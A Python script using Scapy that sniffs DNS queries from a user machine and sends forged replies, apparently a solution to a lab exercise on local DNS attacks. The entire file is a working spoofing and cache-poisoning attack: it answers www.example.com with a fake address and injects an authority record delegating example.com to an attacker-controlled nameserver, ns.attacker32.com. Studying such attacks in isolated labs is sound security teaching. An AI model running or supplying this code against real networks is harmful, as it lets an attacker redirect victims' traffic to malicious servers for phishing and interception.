#!/usr/bin/env python3
from scapy.all import *

def spoof_dns(pkt):
    if (DNS in pkt and 'www.example.com' in pkt[DNS].qd.qname.decode('utf-8')):
        # Swap the source and destination IP address
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Swap the source and destination port number
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        # The Answer Section
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                       ttl=259200, rdata='1.2.3.5')
        # The Authority Section to attacker's nameserver
        NSsec = DNSRR(rrname='example.com', type='NS',
                      ttl=259200, rdata='ns.attacker32.com')
        # The Additional Section record for attacker's NS
        Addsec = DNSRR(rrname='ns.attacker32.com', type='A',
                       ttl=259200, rdata='10.9.0.153')
        # Construct the DNS packet
        DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                     qdcount=1, ancount=1, nscount=1, arcount=1,
                     an=Anssec, ns=NSsec, ar=Addsec)
        # Construct the entire IP packet and send it out
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt)
        print(f"Spoofed: {pkt[DNS].qd.qname.decode()} -> 1.2.3.5 sent to {pkt[IP].src}")

# Sniff only DNS queries from the User machine to avoid catching own packets
f = 'udp and src host 10.9.0.5 and dst port 53'
pkt = sniff(iface='br-328e72dc9f42', filter=f, prn=spoof_dns)